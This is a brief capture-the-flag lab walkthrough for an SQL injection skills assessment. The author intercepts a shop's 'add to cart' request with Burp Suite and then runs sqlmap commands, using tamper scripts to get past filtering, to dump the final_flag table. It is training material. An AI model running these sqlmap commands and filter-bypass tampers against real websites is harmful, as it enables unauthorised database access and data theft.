# Skills Assessment

What's the contents of table final\_flag?

> Hint: First, navigate the website to find potential attack vectors. Then, try to use various security bypassing techniques you learned to get SQL injection working.

Alright! We can see a web store:

<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

> After at time and search information i found the endpoint

We can se into the CATALOG/Shop a button with name "ADD TO CART" and it do something

<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (66).png" alt="" width="362"><figcaption></figcaption></figure>

I can intercept this peticcion with burpsuit and see the traffic -->

<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

Curious... allright, i will to save this peticcion and drop to sqlmap

> Click into peticion + Copy to file + save .txt

```
 sqlmap -r sqlmap.txt -p id --level=5 --risk=3 --batch
```

But... it dosent work... maybe we need use samethings tampers scripts, example -->

```
sqlmap -r sqlmap.txt -p id --level=5 --risk=3 --batch --tamper=between,randomcase
```

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

NICE! It is! We can now dump the table with name "final\_flag" :

```
sqlmap -r sqlmap.txt -p id --level=5 --risk=3 --batch --tamper=between,randomcase -T final_flag --dump
```
